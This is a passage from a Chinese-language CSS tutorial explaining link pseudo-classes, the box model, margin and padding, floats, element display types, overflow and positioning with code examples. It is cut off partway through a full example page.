<h2 id="10-超链接"><a href="#10-超链接" class="headerlink" title="10. 超链接"></a>10. 超链接</h2><h3 id="10-1-超链接状态详解"><a href="#10-1-超链接状态详解" class="headerlink" title="10.1 超链接状态详解"></a>10.1 超链接状态详解</h3><p><strong>详细解释：</strong></p>
<ul>
<li>超链接有四种状态，可以通过伪类选择器进行样式设置</li>
<li>顺序建议：<code>a:link</code> → <code>a:visited</code> → <code>a:hover</code> → <code>a:active</code>（LVHA顺序）</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 未访问的链接 */</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:link</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#0066cc</span>;</span><br><span class="line">    <span class="attribute">text-decoration</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 已访问的链接 */</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:visited</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#6600cc</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 鼠标悬停 */</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#cc0000</span>;</span><br><span class="line">    <span class="attribute">text-decoration</span>: underline;</span><br><span class="line">    <span class="attribute">transition</span>: all <span class="number">0.2s</span> ease;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 激活（点击）状态 */</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:active</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#ff6600</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 为所有状态设置共同样式 */</span></span><br><span class="line"><span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">transition</span>: all <span class="number">0.2s</span> ease;</span><br><span class="line">    <span class="attribute">font-weight</span>: bold;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 为特定链接设置样式 */</span></span><br><span class="line"><span class="selector-class">.nav-link</span> &#123;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">5px</span> <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">3px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.nav-link</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#f0f0f0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="11-盒子模型"><a href="#11-盒子模型" class="headerlink" title="11. 盒子模型"></a>11. 盒子模型</h2><p><strong>详细解释：</strong></p>
<ul>
<li>CSS盒子模型是网页布局的基础</li>
<li>每个HTML元素都被视为一个矩形盒子</li>
<li>盒子由四个部分组成：<ol>
<li><strong>内容区域（content）</strong>：显示实际内容的区域</li>
<li><strong>内边距（padding）</strong>：内容区域与边框之间的空间</li>
<li><strong>边框（border）</strong>：围绕内边距和内容的边框</li>
<li><strong>外边距（margin）</strong>：边框外的空间，用于与其他元素的间隔</li>
</ol>
</li>
</ul>
<p><strong>可视化表示：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+-------------------------------------------+</span><br><span class="line">|               MARGIN                      |</span><br><span class="line">|   +-----------------------------------+   |</span><br><span class="line">|   |             BORDER                |   |</span><br><span class="line">|   |   +---------------------------+   |   |</span><br><span class="line">|   |   |          PADDING          |   |   |</span><br><span class="line">|   |   |   +-------------------+   |   |   |</span><br><span class="line">|   |   |   |                   |   |   |   |</span><br><span class="line">|   |   |   |      CONTENT      |   |   |   |</span><br><span class="line">|   |   |   |                   |   |   |   |</span><br><span class="line">|   |   |   +-------------------+   |   |   |</span><br><span class="line">|   |   |                           |   |   |</span><br><span class="line">|   |   +---------------------------+   |   |</span><br><span class="line">|   |                                   |   |</span><br><span class="line">|   +-----------------------------------+   |</span><br><span class="line">|                                           |</span><br><span class="line">+-------------------------------------------+</span><br></pre></td></tr></table></figure>

<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">    <span class="comment">/* 内容区域 */</span></span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">150px</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 内边距 */</span></span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">20px</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 边框 */</span></span><br><span class="line">    <span class="attribute">border</span>: <span class="number">2px</span> solid <span class="number">#333</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 外边距 */</span></span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">10px</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 背景（显示在padding和content区域） */</span></span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#f0f0f0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong> 默认情况下，元素的总宽度 &#x3D; width + padding-left + padding-right + border-left + border-right + margin-left + margin-right</p>
<h2 id="12-margin与padding"><a href="#12-margin与padding" class="headerlink" title="12. margin与padding"></a>12. margin与padding</h2><h3 id="12-1-padding（内边距）"><a href="#12-1-padding（内边距）" class="headerlink" title="12.1 padding（内边距）"></a>12.1 padding（内边距）</h3><p><strong>详细解释：</strong></p>
<ul>
<li>内边距是内容区域与边框之间的空间</li>
<li>增加内边距会扩大元素的总尺寸</li>
<li>语法：<code>padding: [上] [右] [下] [左];</code></li>
<li>可以单独设置：<code>padding-top</code>、<code>padding-right</code>、<code>padding-bottom</code>、<code>padding-left</code></li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 所有方向相同内边距 */</span></span><br><span class="line"><span class="selector-class">.all</span> &#123;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 上下相同，左右相同 */</span></span><br><span class="line"><span class="selector-class">.vertical-horizontal</span> &#123;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">15px</span> <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 四个方向各不相同 */</span></span><br><span class="line"><span class="selector-class">.four-different</span> &#123;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">15px</span> <span class="number">20px</span> <span class="number">25px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 单独设置 */</span></span><br><span class="line"><span class="selector-class">.specific</span> &#123;</span><br><span class="line">    <span class="attribute">padding-top</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">padding-right</span>: <span class="number">15px</span>;</span><br><span class="line">    <span class="attribute">padding-bottom</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">padding-left</span>: <span class="number">25px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="12-2-margin（外边距）"><a href="#12-2-margin（外边距）" class="headerlink" title="12.2 margin（外边距）"></a>12.2 margin（外边距）</h3><p><strong>详细解释：</strong></p>
<ul>
<li>外边距是边框外的空间，用于与其他元素的间隔</li>
<li>外边距不会影响元素自身尺寸，但会影响与其他元素的距离</li>
<li>语法：<code>margin: [上] [右] [下] [左];</code></li>
<li>可以单独设置：<code>margin-top</code>、<code>margin-right</code>、<code>margin-bottom</code>、<code>margin-left</code></li>
<li><strong>外边距合并</strong>：当两个垂直方向的外边距相邻时，它们会合并为一个外边距，取两者中的较大值</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 所有方向相同外边距 */</span></span><br><span class="line"><span class="selector-class">.all</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 上下相同，左右相同 */</span></span><br><span class="line"><span class="selector-class">.vertical-horizontal</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">15px</span> <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 四个方向各不相同 */</span></span><br><span class="line"><span class="selector-class">.four-different</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">10px</span> <span class="number">15px</span> <span class="number">20px</span> <span class="number">25px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 单独设置 */</span></span><br><span class="line"><span class="selector-class">.specific</span> &#123;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">margin-right</span>: <span class="number">15px</span>;</span><br><span class="line">    <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">margin-left</span>: <span class="number">25px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 居中元素 */</span></span><br><span class="line"><span class="selector-class">.center</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> auto; <span class="comment">/* 水平居中 */</span></span><br><span class="line">    <span class="attribute">width</span>: <span class="number">80%</span>; <span class="comment">/* 必须指定宽度 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 外边距合并示例 */</span></span><br><span class="line"><span class="selector-class">.p1</span> &#123;</span><br><span class="line">    <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.p2</span> &#123;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">30px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* p1和p2之间的实际外边距为30px（较大值），而不是50px */</span></span><br></pre></td></tr></table></figure>

<h2 id="13-float（浮动）"><a href="#13-float（浮动）" class="headerlink" title="13. float（浮动）"></a>13. float（浮动）</h2><p><strong>详细解释：</strong></p>
<ul>
<li>浮动使元素脱离标准文档流，向左或向右移动</li>
<li>其他内容会环绕浮动元素</li>
<li>常用于创建多列布局</li>
<li>浮动元素会影响其父元素的高度（可能导致父元素高度塌陷）</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 向左浮动 */</span></span><br><span class="line"><span class="selector-class">.float-left</span> &#123;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">30%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 向右浮动 */</span></span><br><span class="line"><span class="selector-class">.float-right</span> &#123;</span><br><span class="line">    <span class="attribute">float</span>: right;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">30%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 清除浮动 */</span></span><br><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="attribute">display</span>: table;</span><br><span class="line">    <span class="attribute">clear</span>: both;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 清除左侧浮动 */</span></span><br><span class="line"><span class="selector-class">.clear-left</span> &#123;</span><br><span class="line">    <span class="attribute">clear</span>: left;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 清除右侧浮动 */</span></span><br><span class="line"><span class="selector-class">.clear-right</span> &#123;</span><br><span class="line">    <span class="attribute">clear</span>: right;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 清除两侧浮动 */</span></span><br><span class="line"><span class="selector-class">.clear-both</span> &#123;</span><br><span class="line">    <span class="attribute">clear</span>: both;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>浮动布局示例：</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;clearfix&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;float: left; width: 30%; background: #f0f0f0; padding: 10px;&quot;</span>&gt;</span></span><br><span class="line">        左侧栏</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;float: right; width: 30%; background: #f0f0f0; padding: 10px;&quot;</span>&gt;</span></span><br><span class="line">        右侧栏</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin: 0 35%; background: #e0e0e0; padding: 10px;&quot;</span>&gt;</span></span><br><span class="line">        中间内容。由于左侧和右侧元素浮动，中间内容会自动调整宽度。</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="14-块级元素、行内元素"><a href="#14-块级元素、行内元素" class="headerlink" title="14. 块级元素、行内元素"></a>14. 块级元素、行内元素</h2><h3 id="14-1-块级元素"><a href="#14-1-块级元素" class="headerlink" title="14.1 块级元素"></a>14.1 块级元素</h3><p><strong>详细解释：</strong></p>
<ul>
<li>块级元素独占一行</li>
<li>默认宽度为父元素的100%</li>
<li>可以设置width、height、margin、padding</li>
<li>常见块级元素：<code>&lt;div&gt;</code>, <code>&lt;p&gt;</code>, <code>&lt;h1&gt;</code>-<code>&lt;h6&gt;</code>, <code>&lt;ul&gt;</code>, <code>&lt;ol&gt;</code>, <code>&lt;li&gt;</code>, <code>&lt;table&gt;</code>, <code>&lt;form&gt;</code>, <code>&lt;header&gt;</code>, <code>&lt;footer&gt;</code>, <code>&lt;section&gt;</code>, <code>&lt;article&gt;</code>等</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;background: #f0f0f0; margin: 5px; padding: 10px;&quot;</span>&gt;</span>div - 块级元素<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;background: #e0e0e0; margin: 5px; padding: 10px;&quot;</span>&gt;</span>p - 块级元素<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&quot;background: #d0d0d0; margin: 5px; padding: 10px;&quot;</span>&gt;</span>h1 - 块级元素<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="14-2-行内元素"><a href="#14-2-行内元素" class="headerlink" title="14.2 行内元素"></a>14.2 行内元素</h3><p><strong>详细解释：</strong></p>
<ul>
<li>行内元素不独占一行，与其他行内元素在同一行显示</li>
<li>宽度由内容决定</li>
<li>无法直接设置width、height</li>
<li>水平方向的margin和padding有效，垂直方向无效</li>
<li>常见行内元素：<code>&lt;a&gt;</code>, <code>&lt;span&gt;</code>, <code>&lt;img&gt;</code>, <code>&lt;strong&gt;</code>, <code>&lt;em&gt;</code>, <code>&lt;b&gt;</code>, <code>&lt;i&gt;</code>, <code>&lt;u&gt;</code>, <code>&lt;br&gt;</code>, <code>&lt;input&gt;</code>, <code>&lt;label&gt;</code>等</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;background: #ffcccc;&quot;</span>&gt;</span>span - 行内元素<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background: #ccffcc;&quot;</span>&gt;</span>a - 行内元素<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">strong</span> <span class="attr">style</span>=<span class="string">&quot;background: #ccccff;&quot;</span>&gt;</span>strong - 行内元素<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="14-3-元素类型转换"><a href="#14-3-元素类型转换" class="headerlink" title="14.3 元素类型转换"></a>14.3 元素类型转换</h3><p><strong>详细解释：</strong></p>
<ul>
<li>使用<code>display</code>属性可以转换元素类型</li>
<li>常用值：<ul>
<li><code>block</code>：块级元素</li>
<li><code>inline</code>：行内元素</li>
<li><code>inline-block</code>：行内块元素（像行内元素一样排列，但可以设置宽高）</li>
<li><code>none</code>：不显示元素</li>
</ul>
</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 转换为块级元素 */</span></span><br><span class="line"><span class="selector-class">.inline-to-block</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 转换为行内元素 */</span></span><br><span class="line"><span class="selector-class">.block-to-inline</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: inline;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 转换为行内块元素 */</span></span><br><span class="line"><span class="selector-class">.to-inline-block</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 隐藏元素 */</span></span><br><span class="line"><span class="selector-class">.hidden</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="15-溢出"><a href="#15-溢出" class="headerlink" title="15. 溢出"></a>15. 溢出</h2><p><strong>详细解释：</strong></p>
<ul>
<li><code>overflow</code>属性控制当内容溢出元素框时的行为</li>
<li>常用值：<ul>
<li><code>visible</code>：默认值，内容溢出时正常显示</li>
<li><code>hidden</code>：内容溢出时被裁剪，不可见</li>
<li><code>scroll</code>：内容溢出时显示滚动条（无论是否溢出）</li>
<li><code>auto</code>：内容溢出时自动显示滚动条</li>
<li><code>clip</code>：裁剪内容，不提供滚动机制</li>
</ul>
</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 默认：内容溢出时正常显示 */</span></span><br><span class="line"><span class="selector-class">.visible</span> &#123;</span><br><span class="line">    <span class="attribute">overflow</span>: visible;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 内容溢出时被裁剪 */</span></span><br><span class="line"><span class="selector-class">.hidden</span> &#123;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 始终显示滚动条 */</span></span><br><span class="line"><span class="selector-class">.scroll</span> &#123;</span><br><span class="line">    <span class="attribute">overflow</span>: scroll;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 溢出时自动显示滚动条 */</span></span><br><span class="line"><span class="selector-class">.auto</span> &#123;</span><br><span class="line">    <span class="attribute">overflow</span>: auto;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 水平溢出隐藏，垂直溢出自动滚动 */</span></span><br><span class="line"><span class="selector-class">.x-hidden-y-auto</span> &#123;</span><br><span class="line">    <span class="attribute">overflow-x</span>: hidden;</span><br><span class="line">    <span class="attribute">overflow-y</span>: auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="16-定位"><a href="#16-定位" class="headerlink" title="16. 定位"></a>16. 定位</h2><h3 id="16-1-定位类型详解"><a href="#16-1-定位类型详解" class="headerlink" title="16.1 定位类型详解"></a>16.1 定位类型详解</h3><h4 id="static（静态定位）"><a href="#static（静态定位）" class="headerlink" title="static（静态定位）"></a>static（静态定位）</h4><p><strong>详细解释：</strong></p>
<ul>
<li>默认定位方式</li>
<li>元素在正常文档流中</li>
<li>忽略top、bottom、left、right和z-index属性</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.static</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: static;</span><br><span class="line">    <span class="comment">/* top、bottom等属性无效 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="relative（相对定位）"><a href="#relative（相对定位）" class="headerlink" title="relative（相对定位）"></a>relative（相对定位）</h4><p><strong>详细解释：</strong></p>
<ul>
<li>相对于元素在正常文档流中的位置进行定位</li>
<li>不脱离文档流，其他元素仍按正常流布局</li>
<li>可以使用top、bottom、left、right调整位置</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.relative</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="absolute（绝对定位）"><a href="#absolute（绝对定位）" class="headerlink" title="absolute（绝对定位）"></a>absolute（绝对定位）</h4><p><strong>详细解释：</strong></p>
<ul>
<li>相对于最近的已定位祖先元素（position不是static）进行定位</li>
<li>脱离文档流，不占据空间</li>
<li>如果没有已定位祖先元素，则相对于初始包含块（通常是视口）</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.absolute</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">right</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="fixed（固定定位）"><a href="#fixed（固定定位）" class="headerlink" title="fixed（固定定位）"></a>fixed（固定定位）</h4><p><strong>详细解释：</strong></p>
<ul>
<li>相对于浏览器窗口进行定位</li>
<li>脱离文档流，不占据空间</li>
<li>即使页面滚动，元素位置保持不变</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.fixed</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: fixed;</span><br><span class="line">    <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="sticky（粘性定位）"><a href="#sticky（粘性定位）" class="headerlink" title="sticky（粘性定位）"></a>sticky（粘性定位）</h4><p><strong>详细解释：</strong></p>
<ul>
<li>相对于最近的滚动祖先元素进行定位</li>
<li>在滚动到特定阈值前表现为相对定位，之后表现为固定定位</li>
<li>需要指定至少一个阈值（top、bottom、left或right）</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.sticky</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: sticky;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="16-2-z-index"><a href="#16-2-z-index" class="headerlink" title="16.2 z-index"></a>16.2 z-index</h3><p><strong>详细解释：</strong></p>
<ul>
<li>设置元素的堆叠顺序</li>
<li>值越大，越靠近用户（显示在上层）</li>
<li>仅对定位元素（position不是static）有效</li>
<li>可以是正数、负数或auto</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box1</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">z-index</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box2</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">z-index</span>: <span class="number">2</span>; <span class="comment">/* 会显示在box1之上 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box3</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">z-index</span>: -<span class="number">1</span>; <span class="comment">/* 会显示在其他元素之下 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="综合大例子"><a href="#综合大例子" class="headerlink" title="综合大例子"></a>综合大例子</h2><p>以下是一个包含所有知识点的综合性示例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>DIV+CSS综合示例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 嵌入样式表 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="comment">/* 全局重置 */</span></span></span><br><span class="line"><span class="language-css">        * &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-sizing</span>: border-box;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: <span class="string">&quot;Microsoft YaHei&quot;</span>, <span class="string">&quot;Heiti SC&quot;</span>, <span class="string">&quot;SimSun&quot;</span>, sans-serif;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">line-height</span>: <span class="number">1.6</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#333</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#f5f5f5</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="comment">/* 容器样式 */</span></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">90%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">max-width</span>: <span class="number">1200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="comment">/* 头部样式 */</span></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.header</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(to right, <span class="number">#0066cc</span>, <span class="number">#003366</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.header</span><span class="selector-pseudo">::after</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">content</span>: <span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: table;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">clear</span>: both;</span></span><br><span class="line"><span class="language-css">        